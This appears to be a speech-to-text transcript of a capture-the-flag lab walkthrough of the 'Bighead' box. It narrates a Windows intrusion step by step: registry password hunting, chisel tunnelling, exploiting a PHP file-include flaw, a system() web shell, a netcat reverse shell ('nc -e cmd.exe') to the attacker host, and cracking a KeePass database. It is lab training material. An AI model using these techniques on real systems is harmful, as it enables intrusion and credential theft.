going to be our box which is 10 10 14 3 and we can fix that typo and then while that goes see DSMB oh it's done so cat venom copy this I forgot that and single quotes and make sure I don't forget that when I go into exploit so delete this paste the new one and we also have to change the our host to be dev big head H TB and now let's run Python exploit pi make sure intercept is on and make sure we are listening run this we can see spraying is taking a lot longer and should have taken that long I realized I forgot to set the port when we all go on 80 or eight thousand eight or on port 80 run this we sent the spray we sent the attack go over into a request and we want to get rid of all this extra junk that the module put in click forward and we will wait probably five to ten minutes and after weaning some time we have a shell it just depends on how where did the box is because it has to search through its entire memory until it finds the tag but if we do it who am I we are Nelson so we can do Who am I / all and we don't have that se impersonation privilege that always check for so we can't just easily prove X so let's do net users and let's go back to cherry tree and let's go into let's do web server and then local users and copy this ok so we can do I think it's net local group administrators see if that works it does so we can print this and we are Nelson and we want to get to guilfoyle so let's do a dir and the nginx directory and see if we missed anything so if we go into HTML dir we got Bob manatee doesn't look like anything we got teapot nothing there Pied Piper this is probably the home page so we want to worry about that so let's go see Evan get the configuration of nginx CD comp dir type nginx Kampf and this is everything so this is what I expected when we were on the github page so we got some type of load balancer going on here eighty eighteen eighty twenty eight eight thirty eight eight forty eight so if I had a guess right off the bat this is probably the bighead web service so we got listen on 80 if the server name is bighead htb go to the Pied Piper company blog and then if the server is mailer listen on port 80 this is the email service we got the code so this is how you do the reverse proxy we got bighead web back end that's dev just seeing if we missed anything nope we did not since there is bak manatee so doesn't look like we missed anything let's go into Program Files do I dir let's see we got 7-zip bash immunity it's bit odd for a web server see KPBS what is that this is key pass so dir we can copy all of this and go back to cherry tree Program Files and let's see system tunnels see what's here this is process Explorer so let's go in a nginx it's nginx manager config and we don't have access so this is a leap of faith the next thing is we just query the registry for all keys that have password in it so to do that we will run reg query hklm for H key local machine slash find password /t reg s Z to search for I think Dahl terminated strings and then slash s and I know it's lame like not doing a bunch of a new Mike proper enumeration but this is a Windows 2008 box and things like PowerShell Netta limited so there's not many good tools to do this and it just takes forever to do things manually on these prehistoric boxes so let's go through every key that has password in it so let's see local machine clsid log and password reset that's not interesting we have key pass which we already know is on the box we have nginx password hash and we have something so let's check this echo - n paste WCC 58 which is an odd length and we also have things like 2 e 2 e 2 e 3 to ease there and to e is period so that's dot dot dot terminates with 0 a which is an old byte and this just looks like in the ASCII range so I'm gonna do X X D - P - R and this is going to reverse the hex and it says emergent says that try harder so now we'll say control keep on going we have password hash again and this is control set 0 0 1 control set 0 0 - so nothing special there password hash again and that's it so I'm going to search these services and see what all the keys here are so we're gonna do bridge query H key local machine we're just paste and I guess we have to paste / nginx to go into a service let's see reg query / nginx and this dumps the service config for the nginx service so I did that because of the password hash and we're saying what else it has we have authenticate and then we have as a reg binary string and four eight zero zero three seven zero zero three three zero zero notice zero zero is following everything that just means it's like a 16 byte encoded I believe so we can try the same thing - P - R and this looks like something much more reasonable so if we look at this it says authenticate and then we have object name and Genet's so maybe this is the authentication hash for nginx but regardless let's copy this and put it in a web server and call this nginx config and paste that and then we will highlight this and put that whoops is equal to where is it this decodes to that so now we have to find a way to log into nginx so let's go back and we can do like a netstat - a teo and see if this shows us any ports and hopefully we didn't hang a terminal because then we have to get a shell all over again which is painful nope did not so let's see what do we have we have 80 which is two one one two and three four to eight let's see I guess we should do a copy let's copy a bunch of these and start translating what these services are I wonder if there's a way to get like process name and netstat instead of just PIDs so let's do that's that paste and let's see 3 4 2 8 and 2 1 1 2 is what we want to find first so we'll do task list and then we want to search for 3 4 2 8 that is nginx 3 4 to 8 is nginx and then 2 1 1 2 is also nginx and I don't know what I'm doing here because that's not really too helpful 134 we know 2020 that is a odd point 1504 we have ssh server so found out what I'm doing we want to get into this ssh server so to do that let's use chisel so we have to go to a directory we can write - maybe CD backslash Windows backslash temp echo test - tab do a dir and we can't write here that go test - temp doesn't look like we can so let's try users public let's just go into music echo test - temp dir and we can write and see : users public music so let's delete the file we wrote and we will try to copy chisel so first thing we have to do is go to op chisel and then we can get pull to pull the latest and we'll remove chisel and we want to build a new one so let's do go OS is equal to windows go work is equal to I think 386 and then we'll do go build do ALS we got chiseled exe and it looks like it is a PE 32 executable which is what we want so let's copy this to HB boxes big head SMB and we also have to build chisel for us so we'll just do go build then we can do it LS file on chisel this is an elf 64-bit so that is good we can copy it one copy in the same place and then go into that directory and we have to start a chisel server so we'll do dot slash chisel server port is 80 and we want to allow reverse connections so let's go into our box and we can do xcopy 1010 14 3 chisel DXE here and valid drive specification copy 1010 14 3 chisel exe o xcopy 1010 14 3 share chiseled exe and it looks like it is copying let's see we do have Nelson logging in disconnecting unknown level 4 query path was it share it is share chiswick see so I think it's copying it's just taking it to Mary time there we go so now we got chisel so we can do chisel exe client 10 10 14 3 port 80 reverse connection 2021 27001 or do it 2020 normally I'd like to do a Sox reverse but to do that we'd have to set up like 2 different tunnels I forget what video I go over it but if you just google upset chisel you'll probably find that whatever PowerPoint and explain all that but saying if the socks proxy is painful so we have a connection so let's do netcat localhost 2020 and we can see we get a ssh login prompt so let's try ssh - p 2020 nginx at localhost accept the public key and then go into Cherrytree and let's grab the password so let's see that was in nginx config and decodes to grab this paste it in and we get logged in so let's create a new thing local users and we'll do nginx colon that for the password so now we're in a weird shell if we do ID not found Who am I not found run as not found hit double tab and we can see the commands we have which is it much so let's try to figure out exactly where we are if we do CLS we can clear the screen so let's see we got PHP myadmin so let's see if there's any creds here LS grep config let's cat config dot PHP and we have let's see user users so use a root and we got password so we can back and we'll put Windows users and config and route pass PHP my admin' and just keeping no to this because it may be useful in the future so nothing really outside of more interesting in that there is a anonymous directory whoops LS anonymous incoming in one file let's try Apps we go into Apps we get test link go into test link and there's a binary scripts and htdocs' and also config so let's see what's in the config htaccess Kampf nothing interesting so let's go into htdocs' and this looks like something very similar to where we started when he did recon in the very beginning because i see link to PHP and i think that was the one we had done with Bert if we go to Firefox what was it dev big head HT be forget what it was but it directed us to one 27001 code yeah so code big head HB directs us to the one 27001 so let's make sure we intercept this and again edit where we go I don't know if I select a burp there so go here let's make sure the burp is configure to intercept everything forward and this is where we want to change it to be go bighead htb click go and this directs us into login dot PHP so let's look at login dot PHP to see what this does we can just cat it do we have them then login dot PHP we do not so which is cat login dot PHP go up and see what there is packages test link config ooofff see do we have grep let's grep - are for include and see if we have any include statements crypt era cat changelog holy crap try and control see how this and I can't we'll just wait for the changelog to finish now let's drop that to test greps working for middle it is so now we can probably grep for let's say system on all PHP files does it find anything let's grep for exec we do have one hit but that is in the comments so we can do shell exact next let's see we can do include and let's see and where does it get this plugin variable from so grab that star dot PHP and that is equal to all this stuff so plug a name let's see what plugin name is equal to plug-in name is equal to t matches so it doesn't look too interesting let's go to require let's do require once and we have a lot of things and off the bat we have link to PHP require once to pipe a coin off so let's graph this see where this is linked to dot PHP if set pay per coin off to a post request base64 decode and then require once to execute it so what this is doing is saying hey if the post variable piper ID is set then set piper coin off equal to that variable and then the session we probably don't need and then starting to require once on piper coin off which is the variable we set so we specify any file and we should get code execution so now we have to find a place we can write to so if we go back here looks like we lost our shell but we did write to music let's see can we write in anywhere here let go test to temp permission denied let's see do we have fine dot - writable of course we don't have that command let's see nginx Who am I ID there is a user dot txt file cat user dot text reading binary file as text strings user dot txt echo well let's before we clobber it oh we can't copy it somewhere maybe won't copy it use it of text too - 10 10 14 3 share user text copy do we have CP CP user text 10 10 14 3 share use it our text so really limit out what we can do and I don't want to clobber user dot text if I don't have to so let's see 10 Y dot temp let's see so let´s do echo test - temp permission denied don't know why I can write but we know we can write with big head so let's do that again so let's open a whole new pane go into SMB don't you do NC Helvey mp443 and i know we're listening on it but because we established our connection and cat Forks to the background and no longer listens on the socket so we can start another connection on 4 4 3 despite us listening if that makes sense so python exploit PI make sure perp is set to intercept because we want to remove some headers spring and then come on attack waiting for the last braid to finish um come on any time we could probably kill chisel now but by ctrl C it'll probably kill my whole neck cat shell why is it not intercepting redo this spraying spraying spraying there we go attacking let's get rid of all these headers that we don't need and then for the request and eventually we should get a shell so while we're looking we can see if we can find a oh man I'm not sure you can hear that but this is going now extremely slow so I'm just gonna wait for the shell to return because poking around the box while this is going is infuriating so well just wait that was much faster than last time so now we can go into let's say we can find where we are so PWD apps test link so LS / we are in a directory with xam P P so dir C do we have any xam P P we don't we can go into Kampf and then type nginx Kampf and we executed this on code bighead so let's see where he starts so proxy passed to 5080 location index test link where are you so that gets forwarded to 50 80 and 50 80 did we have that in cherry tree for netstat where is 50 80 it's not here so I don't know where exactly that is so maybe this config is not used so let's see CD HTML talk Manny Pied Piper teapot it's none of those PHP let's see do we have like a www root let's see X a.m. PP that sounds good permission denied so we can't get into that directory but we're assuming that is the directory so CD users public music will write a file here so we'll do echo please subscribe to test dot txt okay so now we'll test link link to PHP send this to repeater click go to make sure this is not a 404 we get 200 ok so let's send this to a post request and then what was that we had to put in let's go back to the SSH and was required once and we need pipe a coin off is equal to post piper coin ID so set this is equal to see there's one two three so dot that slash dot dot slash dot dot slash users public music test dot txt click go and see what happens acquired once failed opening let's see if we another dot dot slash doesn't look like it's working feel to open and I call it test dot text correct I did so users public music users public music test.txt so that may not be a valid directory we can use so let's keep thinking what we can do let's try chain lers two backslashes cuz we're not on linux and that still looks like it's the same error let's try c : o let's change these as well C : users public music okay let's copy this into our and cat to make sure it's a valid file it is maybe we can do echo PHP PHP info dude type on that again shoot I'm gonna direct this to a file check that to test dot PHP dir echo maybe single quotes copy too much PHP PHP info to test dot PHP and that did not work let's just copy a file that would be the easiest thing to do so the test dot PHP and we can do PHP PHP info like that the reason why I'm doing this is so it actually prints something I'm not sure what's going to happen if we include a file and it doesn't have PHP code so xcopy ten ten fourteen three share test dot PHP to this directory and now we should be able to copy a try test dot PHP don't have anything so let's look at the actual source code to make sure we're not missing anything so let's go to link to dot PHP CD htdocs and it is PI Piper coin let's see where is the exploit it's in a post okay so this is it start if is set piper ID and we don't have Piper ID so we need Piper ID well leave call this I guess please subscribe so now we set Piper ID then Piper coin auth is equal to post piper coin ID click go it's taking longer and it looks like we have the PHP NFL so we have validated that we got this working so if we go to a browser we're still waiting we can go into this finally change the request type but this click go and this displays the PHP info page so we have code execution finally so let's create a better shell so go back to netcat and we can do V or do shell dot PHP and this will be PHP system then request hip sack okay and now we want to copy it so shell dot PHP and go back to repeater and step test dot PHP we do show dot PHP and add the variable hips ik is equal to Who am I click go and we are anti-authority slash system so definitely have code execution now we just have to get something on the box but let's um do meterpreter that would be the easiest thing so or we could keep it going and do netcat 64 let's do that look at locate and see 6400 we need 32-bit netcat netcat windows download netcat one one one four one 32 so let's save this and it should have saved so let's go into move downloads netcat here unzip it and then we can move the file oh they put everything here awesome so we have NCO exe so let's copy nc dot exe here and a command will be NC exe - e I think one if we can just do - H get help we probably have to do C : users public music NCT X C - H and we don't get anything so let's do ten ten fourteen three four four four three let's do NCLB mp443 make sure we can connect first we get a connection so now let's try to send a command prompt so let's do - e cmd.exe I think that's it click go and we have a command prompt as an to your authority slash system so now we should finally be able to go into the users good uh I guess administrator I was looking for guilfoyle but he's not there desktop and don't have anything here I don't know what I heard in Tools dot exe is documents Nelson users desktop type user dot txt and we don't have a flag here so where is the user flag let's check the other user on the box which was nginx CD users why don't give doing that desktop dir and we have used it our text that is 32 characters long so I'm guessing that is correct so now we have to find where the hack root text is so let's go to administrator Desktop and examine these files so type chest Ln K and let's see that's program files floating key pass and harden tools exe I don't know what that is if we copy this so let's do X copy harden tools dot exe to ten ten fourteen three share uh ten tools dot exe file it doesn't like this don't it and we have to exit this shell and do we have our L rap let's do app to install or L rap this the thing yep so this is gonna make a shell a little bit less painful so I always forget to do this with netcat and 0 XD f showed me this but will give us the up and down keys to our netcat shells so let's do netcat and put our L rap before it go back into burp send this that should be a show oh I have a bracket click go and I'm not getting a shell what the hell bad request I have a bracket here where do those brackets come from don't have a response don't have a show they'll so where did this Brad it's come from link to see : users music shell dot php' hip sack uses public netcat one of us to wait for like a connection to timeout cancel let's do we mi to make sure connections working looks like we may have crashed big head C ctrl Z till we get to estate we know worked come on somewhere I do Who am I there we go we know this command worked click go and we don't get anything so maybe I'm gonna have to reboot or revert the box which will be a pain well no it won't because we have everything I'll just take you those files back on it click go let's see I think we're gonna reboot the box because I should be able to get my shell back with this command - e 10 10 14 3 port 443 yeah something went bad so gonna reboot the box and see what happens so once I rebooted I got my show back and we can see we're doing orell rap if I do dir I get it up-down left-right and that all works so that's a bit magic so trying to think where we left off we were in users administrator desktop and we were trying to get hardened tools dot exe so let's try that one last time so CP hurtin tools dot exe 210 yeah 10 10 14 3 backslash share and it looks like it is copying it so maybe we just don't want to put file names and the downside is when we do this neck at show and don't fork to a new process the PHP server will die if we leave this session open so as long as we're here we can't do any other requests does the PHP isn't forking so one thing to keep in mind could be a benefit to using meterpreter because you'll generally fork off to a new process there's probably some thing we can do in the command line of executing it to background it so we don't have this issue but we'll just pray we don't run into that loop again we were in SMB and we wanted to get OS cripsy so we copied it let's see how s grap hardened there we go strings hurting tools exe see we have CA certs let's just do md5 some hunting tools dad exe and see if this has a different file name so go out of Firefox turn burp off virus turtlecom and let's search for this hash so it's something and it's calling scanned XE I'm not actually sure what this is could be related to the Box signers just try googling it see if anyone knows its name herdin tools exe probably this so hunting tools to disable features so it looks like it was actually a tool they used too hard in the OS so that's what hard and tools that exe most likely is let's go back to the box and keep exploring this chest link so this is pointing to keep a CXC so let's do a CD dot dot let's do I think it's app data roaming key pass and there this type key pass config.xml so now we're looking into his key pass config and because we had chestie XE that's why I decided to look at it so I'm not because chest wink pointed to this file is why we're looking at it so go to artifacts movie VI keep a sex ml paste that set paste and almost all configuration files for specific users will be an app data that's just how it is we do have a file to users administrator desktop root text zone identify it but we don't have a root text so that's not there either we don't have the chest k dbx so I wonder if something got screwed up so let's see is there anything else we want password true passwords admin dot PNG so we know we knew we need this picture file because that's going to be the key file so let's go back to the box and go dir pictures and then let's copy admin dot PNG to ten ten fourteen three share it as it shares a share share after that one issue earlier I'm really careful about specifying which path it is so you can copy SMB admin dot PNG here and now we have to find the key past database so we go into desktop if we type just link let's see do we have any KD BX or something keep s Exe we can go dir C colon backslash progra one does that work it does so let's go to KPBS to see if that key past database is there we can look at keep a CXC e dot config to see if this is anything tight I thought that was a KPBS copy-paste see do we have anything nothing there let's do /a there it is it's a hidden file that's stupid flash I will show us the extra data so now we can type fruit txt paste how do we get this should be a way we can copy this portion of the file so let's try X copy huh copy root txt to test dot txt and Vala name let's see citizen tunnels was install in the box so maybe they have stream and I just missed it so that is pro go one assist internals and nope that is literally just process Explorer so should be a way to get that stream let's see let's just download streams and do it that way sysinternals streams cuz we don't have power show do we away am i oh we may so we can probably do powershell get content root txt and then this let's do powershell we'll get content maybe it's not that data cannot find a drive with the file name now a shell get content see : users administrator desktop root txt okay so now we want to add these own identifier paste data let's just Google this PowerShell get alternate data stream reading a writing PowerShell so set content get content - dream so we'll do get content so - path and then - stream and that doesn't looks like it worked so maybe this version of PowerShell was too old so let's go back to old thing of just getting this internal stream download streams save a man copy downloads stream zip and SMB unzip streams and we will xcopy 10 10 14 3 share streams exe and we can do James Exe root txt and of course it's assistant Charles tool so we have to accept the EULA okay and how do we view the stream here let's do streams delete - s recur sub directories maybe we can just get it this way maybe this way zone root dot txt streams so I pause the video and did some googling I think this command will do it so if we more and then we direct the file back to us we should get it so more route text zone identifier there we go so we get something that's cool ASCII art right there so this is the key pass config file so we can direct that to keep pass nut config maybe what was this key passed dot something dot th key passed out something is its new name so we can xcopy KP dot something to ten ten fourteen three share and then we'll move SMB KP dot something to a current directory so now all we need is the probably k DB X file unless that's what this is what if we can file key passed out something key passed database so this is the k DB x so move KP dot something to KPK DP X and then we got admin dot PHP so do we have KeePass app search key pass is in the app repository it is not app search KP CLI command line for key path so we can do that app to install KP CLI yes and let's go back into this we want to go into app data roaming key pass key pass oh I've been misspelling key pass all this time whenever I had those errors it's two E's so let's see chest k DB x we have that that was this the last used file and then he's pointing himself to this and there is a password so let's do key pass to John and the key file is going to be admin dot PNG and the database is key past k DB x and unknown file version so we did not copy this file correctly it looks like key file do app install key pass to John make sure we've got it updated we do so we should find a better way I guess to extract that key pass file because I'm not sure what its airing at file version 3 3081 unsupported see is this a known issue let's see I don't see it being a known issue so I'm guessing we just have to find a better way to copy it so I'm going to do is we'll try it from the Linux on this box so if we go back to our shell go to a desktop dir or is it a r /a /r well copy root dot txt to see : XA m PP do a C colon backslash copy root txt to C colon backslash xam PP that should be a file copy root text to test text tailor slash a slash r-type root text copy root text can't find the file root a text that is odd let's see what's in Program Files again program one we have bash so let's try bash dot exe dir LS okay I am in bash so let's do cat root DX t zone identifier was that it it was so let's pipe that to will do test KDB X do it LS we can do do we have md5sum doesn't look like we do let's just copy test dot k DB x - 10 10 14 3 share dir LS oh please say we didn't just hang ourselves again hello a stop that / SMB grep test I think we have to reboot the box again so we'll see go and yes I'm going to reboot once again and hopefully that will be the last time so let's just get our show up try it one last time yep so rebooting the box has been rebooted so I can click go and get my show back and go to users administrator desktop and we copied it to test k DB X and we can see that file is smaller than K P dot something so doing it at a bash did something different than more so let's try copy test k DB x - 10 10 14 3 backslash share and we copied that file so we should be able to copy that out of SMB test KTVX and run John again key pass to John and let's do tasks a dbx and we finally get a hash so now we can go back to a crack in and go into will do hash cat and then we want to go into a hashes directory because that's how I have this organized will do key pass big head txt and we want to go where we have that maybe was a different clip whoops let's do T MUX attached - t HT B and then do control shift insert and that was in that clipboard so we can do dot slash hash cat example hashes I think less key pass 13400 because this looks like mode so let's copy this dot slash hash cat - m and then we want the hashes so that and then I did big heap text not big head whoops rocky text and we have an extra five delimiter so let's remove that there we go and see how long this takes it shouldn't take more than like five minutes on your machine I would not recommend running hash cat in a VM do it on your host it's got a Windows it's got a Linux if you don't have GPUs you can do - - force and wow that was fast but you can do - - force if you don't have GPUs so the password is darkness so we can go out and let's do apt search key pass because I think I type it at last time I did so going to do apt install keepass - maybe we'll try to and then 2x so I spelled KeePass ke y pa SS the last time I did this I guess well that installs we can do KP CLI and then - - k DB it's going to be artifacts let's just go into artifacts so KP CLI - - k DB this is going to be test k DB x - - key is admin and so what that would be it the help has it using equals instead of spaces so let's do that KP COI with no command type help we can do wonder that's weird - - PW files not sure how to use the KP CLI but app should be done installing any second there we go so we can do key pass - and then let's copy this directory copy open it's good there and we want test k DB x master password darkness key file is going to be the same place and this is admin dot PNG click ok and we finally get it root dot txt and I'm not going to you can copy password and paste it don't want to do that and show the route text but there it is that is the box and this was more painful than I expected so I'm not going to be doing the fuzzing thing for the binary I'm sorry but I'll try to put out a specific video on fuzzing relatively soon so take care of guys and I will see you all next week